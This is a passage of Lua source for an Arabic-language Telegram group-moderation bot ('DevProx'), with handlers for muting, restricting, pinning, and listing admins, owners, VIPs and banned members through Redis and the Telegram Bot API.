Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙لٱ تستطيع كتم ↫ '..rank_abs(result.id_, msg.chat_id_), 1, 'md')
else
if DevAbs:sismember(DevProx..abs, result.id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ [@'..ap[2]..'] ❩\n☬︙هوَ بٱڵفعڵ مكتوم في ٱڵـمجموعة', 1, 'md')
else
DevAbs:sadd(DevProx..abs, result.id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ [@'..ap[2]..'] ❩\n☬︙تـۖم كتمة من ٱڵـمجموعة', 1, 'md')
end
end
end
end
resolve_username(ap[2],mute_by_username)
end
--     Source DevProx     --
if text:match("^كتم (%d+)$") and Abbas_Abs(msg) then
local ap = {string.match(text, "^(كتم) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
if DevAbs:sismember(DevProx..'bot:muted:'..msg.chat_id_, ap[2]) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙هوَ بٱڵفعڵ مكتوم في ٱڵـمجموعة', 1, 'md')
end
DevAbs:sadd(DevProx..'bot:muted:'..msg.chat_id_, ap[2])
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم كتمة من ٱڵـمجموعة', 1, 'md')
end
end
end
--     Source DevProx     --
local text = msg.content_.text_:gsub('الغاء كتم','الغاءالكتم')
if text:match("^الغاءالكتم$") and msg.reply_to_message_id_ ~= 0 and Abbas_Abs(msg) then
function unmute_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
local abs = 'bot:muted:'..msg.chat_id_
if not DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙هوَ ڵيس مكتوم ڵيتم كتمة', 1, 'md')
else
DevAbs:srem(DevProx..abs, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـمكتوم ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم ٱڵغٱء كتمة من ٱڵـمجموعة', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unmute_by_reply)
end
--     Source DevProx     --
if text:match("^الغاءالكتم @(.*)$") and Abbas_Abs(msg) then
local ap = {string.match(text, "^(الغاءالكتم) @(.*)$")}
function unmute_by_username(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local absc9 = user_info_ if user_info_ then
if result.id_ then
if not DevAbs:sismember(DevProx..'bot:muted:'..msg.chat_id_, result.id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙هوَ ڵيس مكتوم لٱڵغٱء كتمة', 1, 'md')
else
DevAbs:srem(DevProx..'bot:muted:'..msg.chat_id_, result.id_)
text = '☬︙ٱڵـمكتوم ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم ٱڵغٱء كتمة من ٱڵـمجموعة'
end
end
else
text = '☬︙*ٱڵمعرف غير صحيح*'
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
resolve_username(ap[2],unmute_by_username)
end
--     Source DevProx     --
if text:match("^الغاءالكتم (%d+)$") and Abbas_Abs(msg) then
local ap = {string.match(text, "^(الغاءالكتم) (%d+)$")}
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local absc9 = user_info_ if user_info_ then
if not DevAbs:sismember(DevProx..'bot:muted:'..msg.chat_id_, ap[2]) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙هوَ ڵيس مكتوم ڵيتم كتمة', 1, 'md')
else
DevAbs:srem(DevProx..'bot:muted:'..msg.chat_id_, ap[2])
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـمكتوم ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم ٱڵغٱء كتمة من ٱڵـمجموعة', 1, 'md')
end
end
end
end 
--     Source DevProx     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") then
function donky_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
local abs = 'bot:donky:'..msg.chat_id_
if DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙هوَ مطي شرفع منه بعد😹💔', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم رفعه فيۧ قٱئمة ٱڵمطٱية', 1, 'md')
DevAbs:sadd(DevProx..abs, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end
end
--     Source DevProx     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") then
function donky_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
local abs = 'bot:donky:'..msg.chat_id_
if not DevAbs:sismember(DevProx..abs, result.sender_user_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙هوَ ڵيس مطي ڵيتم تنزيڵه', 1, 'md')
else
DevAbs:srem(DevProx..abs, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـمطي ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم تنزيڵه من قٱئمة ٱڵمطٱية', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then  
if text and text:match("^تقييد$") and Abbas_Abs(msg) or text and text:match("^تقيد$") and Abbas_Abs(msg) then  
function mute_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*لٱ تستطيع تقييدي*', 1, 'md')
return false 
end 
if is_admin(result.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙لٱ تستطيع تقييد ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md')
else 
HTTPS.request("https://api.telegram.org/bot"..tokenbot.."/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.."")
DevAbs:sadd(DevProx..'tkeed:'..msg.chat_id_, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم تقييده من ٱڵـمجموعة', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
--     Source DevProx     --
if msg.reply_to_message_id_ ~= 0 then  
if text and text:match("^الغاء تقييد$") and Abbas_Abs(msg) or text and text:match("^الغاء تقيد$") and Abbas_Abs(msg) then
function mute_by_reply(extra, result, success)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*لٱ تستطيع فك تقييدي*', 1, 'md')  
return false 
end 
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevAbs:srem(DevProx..'tkeed:'..msg.chat_id_, result.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـمقيد ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم ٱڵغٱء تقييده بنجٱح', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
end 
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text == "المقيدين" and Abbas_Abs(msg) then 
local hash  =  'tkeed:'..msg.chat_id_
local list = DevAbs:smembers(DevProx..hash)
text = "☬︙قٱئمة ٱڵـمقيدين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(DevProx.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
else
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
end end
if #list == 0 then
text = "☬︙*لٱ يوجد مقيدين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end end 
if text == 'حذف المقيدين' and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) or text == 'مسح المقيدين' and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then     
local abs =  'tkeed:'..msg.chat_id_
local list = DevAbs:smembers(DevProx..abs)
for k,v in pairs(list) do   
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..v.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
DevAbs:srem(DevProx..'tkeed:'..msg.chat_id_, v)
end 
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف ٱڵمقيدين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end
--     Source DevProx     --
local text = msg.content_.text_:gsub('تقيد دقيقه','تقييد دقيقه')
if text and text:match('^تقييد دقيقه (%d+)$') and Abbas_Abs(msg) then 
local function mut_time(extra, result,success)
local mutept = {string.match(text, "^تقييد دقيقه (%d+)$")}
local Minutes = string.gsub(mutept[1], 'm', '')
local num1 = tonumber(Minutes) * 60 
local num = tonumber(num1)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then end 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*لٱ تستطيع تقييدي*', 1, 'md')
return false end 
if is_admin(result.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙لٱ تستطيع تقييد ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
Mute_time(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم تقييده ڵمدة ↫ '..mutept[1]..' د\n ✓', 1, 'md')
DevAbs:sadd(DevProx..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end 
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end
local text = msg.content_.text_:gsub('تقيد ساعه','تقييد ساعه')
if text and text:match('^تقييد ساعه (%d+)$') and Abbas_Abs(msg) then 
local function mut_time(extra, result,success)
local mutept = {string.match(text, "^تقييد ساعه (%d+)$")}
local hour = string.gsub(mutept[1], 'h', '')
local num1 = tonumber(hour) * 3600 
local num = tonumber(num1)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then end 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*لٱ تستطيع تقييدي*', 1, 'md')
return false end 
if is_admin(result.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙لٱ تستطيع تقييد ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
Mute_time(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم تقييده ڵمدة ↫ '..mutept[1]..' س\n ✓', 1, 'md')
DevAbs:sadd(DevProx..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end 
local text = msg.content_.text_:gsub('تقيد يوم','تقييد يوم')
if text and text:match('^تقييد يوم (%d+)$') and Abbas_Abs(msg) then 
local function mut_time(extra, result,success)
local mutept = {string.match(text, "^تقييد يوم (%d+)$")}
local day = string.gsub(mutept[1], 'd', '')
local num1 = tonumber(day) * 86400 
local num = tonumber(num1)
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local absc9 = user_info_ if user_info_ then end 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*لٱ تستطيع تقييدي*', 1, 'md')
return false end 
if is_admin(result.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙لٱ تستطيع تقييد ↫ '..rank_abs(result.sender_user_id_, msg.chat_id_), 1, 'md') else 
Mute_time(msg.chat_id_,result.sender_user_id_,msg.date_+num1) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو ↫ ❨ ['..absc9..'] ❩\n☬︙تـۖم تقييده ڵمدة ↫ '..mutept[1]..' ي\n ✓', 1, 'md')
DevAbs:sadd(DevProx..'bot:mutet:'..msg.chat_id_,result.sender_user_id_) end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end end 
--     Source DevProx     --
if is_owner(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and Abbas_Abs(msg) then 
if DevAbs:sismember(DevProx.."bot:pin:mutepin",msg.chat_id_) and not is_monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_,msg.id_, 1, "☬︙ٱڵتثبيت وٱڵغٱء وٱعٱدة ٱڵتثبيت تم قفڵه من قبڵ ٱڵمنشئين ٱلٱسٱسيين", 1, 'md')
return false  
end
local id = msg.id_
local msgs = {[0] = id}
pin(msg.chat_id_,msg.reply_to_message_id_,1)
DevAbs:set(DevProx..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تثبيت ٱڵـرسٱڵة بنجٱح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text == "الادمنيه" and Abbas_Abs(msg) or text == "الادمنية" and Abbas_Abs(msg) then 
local abs =  'abs:admins:'..msg.chat_id_
local list = DevAbs:smembers(DevProx..abs)
text = "☬︙قٱئمة ٱلٱدمنية ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(DevProx.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
else
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
end end
if #list == 0 then
text = "☬︙*لٱ يوجد ٱدمنية*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end end
--     Source DevProx     -- 
if is_monshid(msg.sender_user_id_, msg.chat_id_) then
if text == "المنشئين" and Abbas_Abs(msg) then 
local list = DevAbs:smembers(DevProx..'abs:monshid:'..msg.chat_id_)
text = "☬︙قٱئمة ٱڵـمنشئين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(DevProx.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
else
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
end end
if #list == 0 then 
text = "☬︙*لٱ يوجد منشئين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end 
--     Source DevProx     -- 
if text == "الادمنيه العامين" and Abbas_Abs(msg) then 
local abs =  'abs:adminall:'
local list = DevAbs:smembers(DevProx..abs)
text = "☬︙قٱئمة ٱلٱدمنية ٱڵعٱمين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(DevProx.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
else
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
end end
if #list == 0 then
text = "☬︙*لٱ يوجد ٱدمنية عٱمين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end  
--     Source DevProx     --
if text == "المميزين" and Abbas_Abs(msg) then 
local list = DevAbs:smembers(DevProx..'abs:vipmem:'..msg.chat_id_)
text = "☬︙قٱئمة ٱڵـمميزين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(DevProx.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
else
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
end end
if #list == 0 then 
text = "☬︙*لٱ يوجد مميزين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end 
--     Source DevProx     --
if text == "قائمه المطايه" and Abbas_Abs(msg) or text == "المطايه" and Abbas_Abs(msg) then
local list = DevAbs:smembers(DevProx..'bot:donky:'..msg.chat_id_)
text = "☬︙قٱئمة مطٱية ٱڵمجموعة 😹💔 ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local user_info = DevAbs:get(DevProx.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
else
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
end end
if #list == 0 then
text = "☬︙*لٱ يوجد مطٱيه كڵهٱ ٱوٱدم* 😹💔"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end
--     Source DevProx     --
if text == "المميزين عام" and Abbas_Abs(msg) or text == "المميزين العام" and Abbas_Abs(msg) then 
local list = DevAbs:smembers(DevProx..'abs:vipall:')
text = "☬︙قٱئمة ٱڵـمميزين ٱڵعٱم ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(DevProx.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
else
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
end end
if #list == 0 then 
text = "☬︙*لٱ يوجد مميزين عٱم*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end 
--     Source DevProx     --
if text == "المكتومين" and Abbas_Abs(msg) then 
local list = DevAbs:smembers(DevProx..'bot:muted:'..msg.chat_id_)
text = "☬︙قٱئمة ٱڵـمكتومين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(DevProx.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
else
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
end end
if #list == 0 then 
text = "☬︙*لٱ يوجد مكتومين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end 
--     Source DevProx     --
if text == "المدراء" and Abbas_Abs(msg) or text == "مدراء" and Abbas_Abs(msg) then 
local list = DevAbs:smembers(DevProx..'abs:owners:'..msg.chat_id_)
text = "☬︙قٱئمة ٱڵـمدرٱء ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(DevProx.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
else
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
end end
if #list == 0 then 
text = "☬︙*لٱ يوجد مدرٱء*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end 
--     Source DevProx     --
if text == "المدراء العامين" and Abbas_Abs(msg) then 
local list = DevAbs:smembers(DevProx..'abs:ownerall:')
text = "☬︙قٱئمة ٱڵـمدرٱء ٱڵعٱمين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(DevProx.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
else
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
end end
if #list == 0 then 
text = "☬︙*لٱ يوجد مدرٱء عٱمين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end
--     Source DevProx     --
if text == "المنشئ" and Abbas_Abs(msg) or text == "المنشئين الاساسيين" and Abbas_Abs(msg) or text == "منشئين اساسيين" and Abbas_Abs(msg) then 
local list = DevAbs:smembers(DevProx..'abs:monsh:'..msg.chat_id_)
text = "☬︙قٱئمة ٱڵمنشئين ٱلٱسٱسيين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(DevProx.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
else
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
end end
if #list == 0 then 
text = "☬︙*لٱ يوجد منشئين ٱسٱسيين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end 
--     Source DevProx     --
if text == "المحظورين" and Abbas_Abs(msg) or text == "المحضورين" and Abbas_Abs(msg) then 
local list = DevAbs:smembers(DevProx..'bot:banned:'..msg.chat_id_)
text = "☬︙قٱئمة ٱڵـمحظورين ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(DevProx.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
else
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
end end
if #list == 0 then 
text = "☬︙*لٱ يوجد محظورين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end end
--     Source DevProx     --
if text and text:match("^ضع دعم$") and is_sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "️☬︙ٱرسڵ رٱبط ٱڵكروب ٱو معرف ٱڵـدعم \n☬︙ڵيتوٱصڵ معك ٱڵمتٱبعين من خلٱڵه ", 1, "md")
DevAbs:setex(DevProx.."bot:support:link" .. msg.sender_user_id_, 120, true)
end
if text and text:match("^حذف الدعم$") and is_sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم حـذف معڵومٱت ٱڵـدعم ", 1, "md")
DevAbs:del(DevProx.."bot:supports:link")
end
--     Source DevProx     --
if is_sudo3(msg.sender_user_id_, msg.chat_id_) then
if text == "قائمه العام" and Abbas_Abs(msg) or text == "المحظورين عام" and Abbas_Abs(msg) or text == "↫ قائمه العام ☬" and Abbas_Abs(msg) then 
local list = DevAbs:smembers(DevProx..'bot:gban:')
text = "☬︙قٱئمة ٱڵـحظر ٱڵعٱم ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(DevProx.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
else
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
end end
if #list == 0 then 
text = "☬︙*لٱ يوجد محظورين عٱم*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end 
end 
--     Source DevProx     --
if is_sudo3(msg.sender_user_id_, msg.chat_id_) then
if text == "المطورين" and Abbas_Abs(msg) or text == "↫ المطورين ☬" and Abbas_Abs(msg) then 
local abs =  'abs:sudo3:'
local list = DevAbs:smembers(DevProx..abs)
text = "☬︙مطورين ٱڵـبوت ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
local user_info = DevAbs:get(DevProx.."user:Name" .. v)
if user_info then
local username = user_info
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
else
text = text..k.."⌯ ❨["..username.."]❩ • ❨"..v.."❩\n"
end end
if #list == 0 then
text = "☬︙*عذرٱ ڵم يتم رفع ٱي مطورين*"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end end end
--     Source DevProx     --
if text ==("كشف") and msg.reply_to_message_id_ ~= 0 and Abbas_Abs(msg) or text ==("ايدي") and msg.reply_to_message_id_ ~= 0 and Abbas_Abs(msg) then 
function id_by_reply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(218385683) then
t = 'مبرمج ٱڵسورس'
elseif tonumber(result.sender_user_id_) == tonumber(bot_id) then
t = 'هذٱ ٱڵبوت'
elseif tonumber(result.sender_user_id_) == tonumber(DevId) then
t = 'مطۄر ٱسٱسي'
elseif DevAbs:sismember(DevProx..'abs:sudo3:',result.sender_user_id_) then
t = 'مطۄر ثٱڵث'
elseif DevAbs:sismember(DevProx..'abs:monsh:'..msg.chat_id_,result.sender_user_id_) then
t = 'منشئ ٱسٱسي'
elseif DevAbs:sismember(DevProx..'abs:monshid:'..msg.chat_id_,result.sender_user_id_) then
t = 'منشئ'
elseif DevAbs:sismember(DevProx..'abs:owners:'..msg.chat_id_,result.sender_user_id_) then
t = 'مدير'
elseif DevAbs:sismember(DevProx..'abs:admins:'..msg.chat_id_,result.sender_user_id_) then
t = 'ٱدمن'
elseif DevAbs:sismember(DevProx..'abs:vipall:',result.sender_user_id_) then
t = 'مميز عٱم'
elseif DevAbs:sismember(DevProx..'abs:ownerall:',result.sender_user_id_) then
t = 'مدير عٱم'
elseif DevAbs:sismember(DevProx..'abs:adminall:',result.sender_user_id_) then
t = 'ٱدمن عٱم'
elseif DevAbs:sismember(DevProx..'abs:vipmem:'..msg.chat_id_,result.sender_user_id_) then
t = 'عضو مميز'
else
t = 'مجرد عضو'
end
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = result.sender_user_id_},function(arg,da) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = result.sender_user_id_,offset_ = 0,limit_ = 100},function(arg,pho) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if pho.total_count_ == 0 then
photouser = ''
else
photouser = '\n☬︙صوره ↫ ❨ '..pho.total_count_
end
if pho.total_count_ == 0 then
photouser1 = ''
else
photouser1 = '\n☬︙صوره ↫ ❨ '..pho.total_count_
end
local user_msgs = DevAbs:get(DevProx..'user:msgs'..msg.chat_id_..':'..data.id_) or 0
local msguser = tonumber(DevAbs:get(DevProx..'user:msgs'..msg.chat_id_..':'..data.id_))
if DevAbs:sismember(DevProx..'bot:gban:',result.sender_user_id_) then
Tkeed = 'محظور عام'
elseif DevAbs:sismember(DevProx..'bot:banned:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'محظور'
elseif DevAbs:sismember(DevProx..'bot:muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مكتوم'
elseif DevAbs:sismember(DevProx..'tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'مقيد'
else
Tkeed = 'لا يوجد'
end
if da.status_.ID == "ChatMemberStatusKicked" then
tt = 'مطرود'
elseif da.status_.ID == "ChatMemberStatusLeft" then
tt = 'مغادر'
elseif da.status_.ID ~= "ChatMemberStatusLeft" then
tt = 'موجود'
end
if da.status_.ID == "ChatMemberStatusCreator" then
Renk = 'منشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
Renk = 'ٱدمن'
